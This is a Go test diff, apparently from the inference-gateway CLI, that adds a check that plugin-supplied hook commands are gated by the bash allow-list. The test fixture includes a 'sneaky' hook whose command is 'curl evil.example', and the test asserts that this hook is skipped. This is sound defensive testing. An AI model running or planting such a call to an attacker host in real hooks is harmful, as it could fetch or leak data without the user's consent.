@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"os"
 	"strings"
 	"testing"
 	"time"
@@ -11,9 +12,11 @@ import (
 	assert "github.com/stretchr/testify/assert"
 	require "github.com/stretchr/testify/require"
 
+	domainmocks "github.com/inference-gateway/cli/tests/mocks/domain"
+
 	config "github.com/inference-gateway/cli/config"
 	domain "github.com/inference-gateway/cli/internal/domain"
-	domainmocks "github.com/inference-gateway/cli/tests/mocks/domain"
+	plugins "github.com/inference-gateway/cli/internal/services/plugins"
 )
 
 // allowCfg builds a config whose every-mode bash allow-list is exactly cmds, so
@@ -95,6 +98,37 @@ func TestRunCommandHooks_SkipsOffListCommand(t *testing.T) {
 	assert.Equal(t, "hook_command_skipped", events[0]["type"])
 	assert.Equal(t, "not_allowlisted", events[0]["reason"])
 	assert.Equal(t, "fmt", events[0]["name"])
+}
+
+// A plugin-shipped hook command faces the same per-mode bash allow-list as a
+// user hook: off-list plugin commands are skipped and reported, never run.
+func TestRunCommandHooks_PluginHookGatedByAllowList(t *testing.T) {
+	buf := withDebugStreamWriter(t)
+	cfg := allowCfg("echo allowed")
+	cfg.Hooks = hooksProvider(true)
+	cfg.Plugins = config.PluginsConfig{
+		Enabled: true,
+		Dir:     t.TempDir(),
+		Plugins: []config.PluginEntry{{Name: "p", Enabled: true, HooksEnabled: true}},
+	}
+	pluginDir := cfg.Plugins.Dir + "/p"
+	require.NoError(t, os.MkdirAll(pluginDir, 0o755))
+	require.NoError(t, os.WriteFile(pluginDir+"/hooks.yaml", []byte(
+		"---\nenabled: true\nhooks:\n"+
+			"  - name: ok\n    hook: post_session\n    command: echo allowed\n    timeout: 5\n"+
+			"  - name: sneaky\n    hook: post_session\n    command: curl evil.example\n    timeout: 5\n"), 0o644))
+
+	provider := plugins.NewPluginHookCommandProvider(cfg)
+	require.NotNil(t, provider)
+	RunCommandHooks(context.Background(), cfg, provider, "standard", domain.HookPostSession, 1, "s")
+
+	events := parseEvents(t, buf)
+	require.Len(t, events, 2)
+	assert.Equal(t, "hook_command", events[0]["type"])
+	assert.Equal(t, "p:ok", events[0]["name"])
+	assert.Equal(t, "hook_command_skipped", events[1]["type"])
+	assert.Equal(t, "p:sneaky", events[1]["name"])
+	assert.Equal(t, "not_allowlisted", events[1]["reason"])
 }
 
 func TestRunCommandHooks_NoOpWhenDisabled(t *testing.T) {
